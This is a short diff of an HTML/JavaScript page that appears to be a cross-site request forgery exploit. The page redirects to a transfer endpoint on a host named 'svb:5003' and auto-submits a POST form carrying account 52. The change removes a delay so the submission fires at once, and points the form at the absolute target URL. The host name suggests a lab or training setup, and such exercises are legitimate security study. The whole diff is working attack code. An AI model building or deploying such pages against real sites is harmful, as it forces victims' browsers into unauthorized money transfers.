@@ -60,16 +60,18 @@
 			window.location.href = "http://svb:5003/transfer/1";
 			console.log("WORKING")
 			// Wait for the redirect to complete, then submit the form
-			setTimeout(function() {
-				document.getElementById("transferForm").submit();
-			}, 5000); // 5 seconds delay before submitting the form
+			// setTimeout(function() {
+			// 	document.getElementById("transferForm").submit();
+			// }, 5000); // 5 seconds delay before submitting the form
+			document.getElementById("transferForm").submit();
+
             console.log("WORKING 2")
 
 		}
 	</script>
 </head>
 <body>
-        <form method="POST" action="/transfer/1" name="transferForm">
+        <form method="POST" action="http://svb:5003/transfer/1" name="transferForm">
             <div class="field">
                 <div class="control">
                     <input class="input is-large" type="text" name="account" value="52">
